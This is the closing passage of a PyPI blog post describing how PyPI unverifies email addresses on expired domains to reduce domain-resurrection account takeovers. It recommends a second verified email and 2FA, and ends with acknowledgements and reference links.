<p><img alt="Expired by date" src="https://blog.pypi.org/assets/2025-08-13-unverified-by-day.png"></p>
<p>Since the initial implementation early June 2025,
PyPI has unverified over 1,800 email addresses (initial 1,500 excluded from chart),
and will continue to do so daily, to protect both PyPI account holders,
as well as the end users of PyPI packages.</p>
<h2 id="recommendations-for-end-users">Recommendations for end users</h2>
<p>If your PyPI account only has a <strong>single verified</strong> email address from a custom domain name,
add a <strong>second verified</strong> email address from another notable domain (e.g. Gmail) to your account.</p>
<p>During a PyPI account recovery, PyPI may ask for other proofs,
often via other services under the user's control.
If the same email address is used on those other services, the recovery could appear legitimate.
Ensure you have 2FA set on those services as well to prevent potential account takeovers.</p>
<h2 id="thats-all-for-now-folks">That's all for now, folks</h2>
<p>While these changes are not foolproof,
they decrease the likelihood of domain resurrections account takeovers.</p>
<p>Thanks to Eric Case at <a href="https://www.fastly.com/">Fastly</a> for helping us understand some of the complexities
and Samuel Giddins at <a href="https://rubycentral.org/">Ruby Central</a> for their initial ideas of this approach,
and the <a href="https://repos.openssf.org/">OpenSSF Securing Software Repositories Working Group</a>
for their collaborative guidance on repository security.</p>
<p>This effort would not be possible without the continued support from <a href="https://alpha-omega.dev/">Alpha-Omega</a>.</p>

<ul>
<li><a href="https://en.wikipedia.org/wiki/Domain_hijacking">Wikipedia: Domain hijacking</a></li>
<li><a href="https://capec.mitre.org/data/definitions/50.html">CAPEC-50: Password Recovery Exploitation</a></li>
<li><a href="https://capec.mitre.org/data/definitions/695.html">CAPEC-695: Repo Jacking</a></li>
<li><a href="https://repos.openssf.org/principles-for-package-repository-security">OpenSSF: Principles for Package Repository Security</a></li>
<li><a href="https://arxiv.org/abs/2112.10165">arxiv: What are Weak Links in the npm Supply Chain?</a></li>
</ul>







  
  



  


  



      
    </article>
  </div>
        
          
        
      </main>
      
        
      
    </div></div>]]></description>
        </item>
    </channel>
</rss>